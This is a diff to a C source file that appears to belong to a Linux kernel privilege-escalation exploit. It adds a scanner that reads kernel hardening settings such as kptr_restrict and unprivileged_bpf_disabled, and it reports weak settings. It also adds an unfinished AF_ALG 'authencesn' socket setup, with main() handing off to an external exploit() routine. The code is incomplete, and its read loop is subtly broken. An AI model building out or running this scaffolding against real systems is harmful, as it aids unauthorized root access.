@@ -5,6 +5,7 @@
 #include <err.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <linux/if_alg.h>
 #include <pthread.h>
 #include <sched.h>
 #include <stdarg.h>
@@ -16,6 +17,8 @@
 #include <sys/ioctl.h>
 #include <sys/mman.h>
 #include <sys/resource.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
 #include <sys/syscall.h>
 #include <unistd.h>
 
@@ -328,3 +331,96 @@ static int bpf_map_freeze(int fd) {
  */
 
 #endif
+
+usize read_exact(int fd, char *dst, usize n) {
+    usize nbytes = 0;
+    while (nbytes < 0) {
+        usize chunk = chk(read(fd, &dst[nbytes], n - nbytes));
+        nbytes += chunk;
+    }
+    return nbytes;
+}
+
+char *read_file(const char *path) {
+    struct stat finfo;
+    int fd = chk(open(path, O_RDONLY));
+    chk(fstat(fd, &finfo));
+    char *data = malloc(finfo.st_size);
+    read_exact(fd, data, finfo.st_size);
+    return data;
+}
+
+int read_sysctl_i(const char *path) {
+    char *data = read_file(path);
+    int param = atoi(data);
+    free(data);
+    return param;
+}
+
+int copy_fail_write() {
+    int fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
+    if (0 > fd) {
+        panic("AF_ALG unavailable");
+    }
+
+    const char *salg_name = "aead";
+    const char *salg_type = "authencesn(hmac(sha256),cbc(aes))";
+    struct sockaddr_alg sa;
+    memset(&sa, 0, sizeof(sa));
+    sa.salg_family = AF_ALG;
+    strncpy((char *)sa.salg_name, salg_name, sizeof(sa.salg_name));
+    strncpy((char *)sa.salg_type, salg_type, sizeof(sa.salg_type));
+    if (0 > bind(fd, (const struct sockaddr *)&sa, sizeof(sa))) {
+        panic("bind failed: %s %s\n", salg_name, salg_type);
+    }
+
+    // if (0 > bind(fd, "aead", ))
+    return 0;
+}
+
+int copy_fail() { return 0; }
+
+#define ARGS int argc, char *argv[], char *envp[]
+
+const char *KERNEL_CMDLINE = "/proc/cmdline";
+const char *KERNEL_VERSION = "/proc/version";
+const char *KERNEL_CONFIG = "/proc/config.gz";
+const char *PERF_EVENT_PARANOID = "/proc/sys/kernel/perf_event_paranoid";
+const char *DMESG_RESTRICT = "/proc/sys/kernel/dmesg_restrict";
+const char *KPTR_RESTRICT = "/proc/sys/kernel/kptr_restrict";
+const char *UNPRIVILEGED_BPF_DISABLED =
+    "/proc/sys/kernel/unprivileged_bpf_disabled";
+const char *PANIC_ON_WARN = "/proc/sys/kernel/panic_on_warn";
+const char *PID_MAX = "/proc/sys/kernel/pid_max";
+
+// check /proc/crypto for copy fail
+
+int scan() {
+    char *kernel_cmdline = read_file(KERNEL_CMDLINE);
+    char *kernel_version = read_file(KERNEL_VERSION);
+    int perf_event_paranoid = read_sysctl_i(PERF_EVENT_PARANOID);
+    int dmesg_restrict = read_sysctl_i(DMESG_RESTRICT);
+    int kptr_restrict = read_sysctl_i(KPTR_RESTRICT);
+    int unprivileged_bpf_disabled = read_sysctl_i(UNPRIVILEGED_BPF_DISABLED);
+    int panic_on_warn = read_sysctl_i(PANIC_ON_WARN);
+    int pid_max = read_sysctl_i(PID_MAX);
+
+    info("kernel cmdline = %s", kernel_cmdline);
+    info("%s = %d", PERF_EVENT_PARANOID, perf_event_paranoid);
+    info("%s = %d", DMESG_RESTRICT, dmesg_restrict);
+    info("%s = %d", KPTR_RESTRICT, kptr_restrict);
+
+    if (perf_event_paranoid < 2) {
+        info("%s is not 2, kernel leaks possible", PERF_EVENT_PARANOID);
+    }
+
+    copy_fail_write();
+    return 0;
+}
+
+extern int exploit(ARGS);
+
+int main(int argc, char *argv[], char *envp[]) {
+    scan();
+    return exploit(argc, argv, envp);
+}
